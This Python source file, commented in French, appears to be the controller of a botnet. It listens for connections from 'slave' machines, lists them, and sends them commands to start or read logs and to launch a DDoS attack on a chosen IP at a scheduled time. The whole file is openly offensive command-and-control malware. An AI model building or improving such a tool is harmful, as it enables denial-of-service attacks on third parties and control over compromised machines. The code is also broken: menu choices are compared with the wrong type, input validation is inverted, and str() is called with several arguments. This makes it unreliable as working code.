import subprocess
import threading
import time
import socket
import os, sys, random
import logging
import platform

from pip._vendor.distlib.compat import raw_input

help='''
ddos <ip/date>
Options:
        start_log       Crée un fichier log 
        get_log         Affiche les logs (entrez un nombre avant)
        stop_log        Arrete le logging
	ping      	Affiche le statut des slaves
	list 		Affiche les machines en ligne

'''

all_connections = []
all_address = []

#verification du choix de fonction
def choix_valide (choix,min,max):
	if int (choix) < int (max) or int (choix) > int  (min):
		if input('Etes vous certain de votre choix ? (y/n)\n') == 'y':
			return True
	else:
		print("\n", "!"*4, "   Choix non valide.   ", "!"*4, "\n")
		return False

#boucle de connexion
def connexion():
    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)
            all_connections.append(conn)
            all_address.append(address)
        except:
            print("Erreur de connexion")

#MAIN
if __name__ == '__main__':
	host = "127.0.0.1"
	port = 9999
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port)) #on lie le port et l'addresse
	s.listen(50)
	threading.Thread(target=connexion).start() #appel de fonction via thread (test)
	cmd =""

	#boucle d'appel de commandes dans le master (pe a utiliser pour get_log etc ?)
	while True:
		print("*"*6, "Entrez votre choix :", "*"*6, "\n 1 : Lancer le logging sur les machines esclaves\n 2 : Arreter le logging sur les machines esclaves")
		print(" 3 : Obtenir les n dernieres lignes des fichiers log\n 4 : Lancer une attaque ddos sur un site web.\n 5 : Lister les machines esclaves \n 6 : Obtenir de l'aide")
		choix = raw_input(" 0 : Sortir de ce menu\n")

		test = choix_valide(choix, 0, 6)


		if test == True:
			if choix == 1: #commencerlog
				cmd = 'start_log'

			elif choix == 2: #stopper log
				cmd = 'stop_log'

			elif choix == 3: #recuperer lignes fin de log
				nbr = raw_input("\nCombien de lignes voulez vous obtenir ? (minimum 1, maximum 9)\n")
				test2 = choix_valide(nbr, 1, 9)
				if test2 == True:
					cmd = 'get_log'+nbr
				else:
					while test2 is False or nbr == 0:
						nbr = raw_input("\nEntrez un chiffre valide (de 1 a 9) ou 0 pour sortir de ce menu\n")

			elif choix == 4:    #lancer l'attaque ddos

				target_IP = raw_input ("\Entrez l'IP cible :")
				A_att = raw_input("Entrez la date de l'attaque \n L'année (ex) 1995) :")
				M_att = raw_input("Le mois (ex: 12) :")
				J_att = raw_input("Le jour (ex: 09) :")
				h_att = raw_input("Entrez l'heure de l'attaque : \n L'heure (ex: 15) :")
				m_att = raw_input("Les minutes (ex: 07) :")
				s_att = raw_input("Les secondes (ex : 53) :")
				temps_attaque = str(A_att,";",  M_att,";",  J_att," ", h_att,";",  m_att,";",  s_att)
				cmd = str('ddos ', target_IP, " ", temps_attaque)

			elif choix == 5:            #lister les machines esclaves
				results = ''
				for i, conn in enumerate(all_connections):
					results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
				print("----Clients actifs----" + "\n" + results)


			c = 0
			for n in all_connections:
				cmd = str(cmd)
				cmd = str.encode(cmd)
				n.send(cmd)
				print("[+] {} {}".format(all_address[c][0],n.recv(1024).decode("utf-8")))

		else:
			continue
